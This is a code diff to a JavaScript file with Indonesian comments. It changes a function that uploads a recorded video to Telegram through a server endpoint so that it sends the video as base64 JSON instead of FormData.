@@ -39,19 +39,32 @@ async function tgSendLocation(lat, lon) {
 
 /**
  * Kirim file video ke Telegram (melalui /api/send-video).
+ * Video dikonversi ke base64 agar chat_id bisa diisi di sisi server.
  * Fallback ke sendDocument ditangani di sisi server.
  * @param {Blob}   blob    - Blob video hasil rekaman
  * @param {string} caption - Caption yang disertakan
  */
 async function tgSendVideo(blob, caption) {
   const ext = blob.type?.includes('mp4') ? 'mp4' : 'webm';
-  const formData = new FormData();
-  formData.append('chat_id', '');   // chat_id diisi server dari env var
-  formData.append('video', blob, `periksa_makanan.${ext}`);
-  formData.append('caption', caption);
-  formData.append('supports_streaming', 'true');
 
-  const res = await fetch('/api/send-video', { method: 'POST', body: formData });
+  // Konversi Blob → base64 agar bisa dikirim lewat JSON
+  const base64 = await new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload  = () => resolve(reader.result.split(',')[1]); // strip "data:...;base64,"
+    reader.onerror = reject;
+    reader.readAsDataURL(blob);
+  });
+
+  const res = await fetch('/api/send-video', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      videoBase64: base64,
+      mimeType: blob.type || 'video/webm',
+      ext,
+      caption,
+    }),
+  });
   const data = await res.json();
   if (!data.ok) throw new Error(`Telegram sendVideo: ${data.description}`);
   return data;
